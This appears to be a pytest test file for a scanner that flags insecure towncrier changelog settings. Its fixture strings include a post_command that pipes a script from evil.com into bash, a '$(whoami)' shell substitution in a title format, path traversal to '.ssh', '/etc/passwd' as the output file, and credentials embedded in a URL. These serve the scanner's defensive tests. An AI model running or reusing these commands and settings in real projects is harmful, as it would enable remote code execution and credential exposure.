"""Tests for TowncrierAnalyzer."""

from pathlib import Path

from devai.towncrier_analyzer import TowncrierAnalyzer, TowncrierFinding


INSECURE_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.towncrier]
package = "example"
directory = "../.ssh"
filename = "/etc/passwd"
template = "../../outside/template.md"
title_format = "## [{version}] - $(whoami)"
issue_format = "`#{issue} <http://user:pass@github.com/org/repo/issues/{issue}>`_"
single_file = false
api_key = "hardcoded-secret-token-12345"
"""

HARDENED_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.towncrier]
package = "example"
directory = "changelog.d"
filename = "CHANGELOG.md"
template = "changelog.d/template.md"
title_format = "## [{version}] - {project_date}"
issue_format = "`#{issue} <https://github.com/org/repo/issues/{issue}>`_"
single_file = true
"""

INSECURE_TOWNCRIER_TOML = """\
[tool.towncrier]
directory = "changelog.d"
filename = "CHANGELOG.md"
issue_format = "`#{issue} <http://evil.com/issues/{issue}>`_"
post_command = "curl http://evil.com/install.sh | bash"
"""


class TestTowncrierAnalyzer:
    def test_detects_insecure_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TowncrierAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "path_traversal" in kinds
        assert "absolute_path" in kinds
        assert "format_shell_metachar" in kinds
        assert "scm_credentials" in kinds
        assert "single_file_disabled" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_pyproject_clean(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = TowncrierAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_towncrier_toml(self, tmp_path: Path):
        (tmp_path / "towncrier.toml").write_text(INSECURE_TOWNCRIER_TOML, encoding="utf-8")
        analyzer = TowncrierAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == "towncrier.toml" for f in findings)
        assert any(f.kind == "insecure_http" for f in findings)
        assert any(f.kind == "dangerous_command" for f in findings)

    def test_skips_pyproject_without_towncrier(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "example"\nversion = "0.1.0"\n',
            encoding="utf-8",
        )
        analyzer = TowncrierAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TowncrierAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "pyproject.toml"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = TowncrierAnalyzer(str(tmp_path))
        assert "Towncrier configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Towncrier analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = TowncrierAnalyzer(".").generate_hardened_template()
        assert "towncrier" in snippet.lower()
        assert "single_file = true" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = TowncrierAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = TowncrierFinding(
            kind="test",
            severity="low",
            message="test message",
            path="pyproject.toml",
            lineno=1,
        )
        assert "test message" in finding.format()
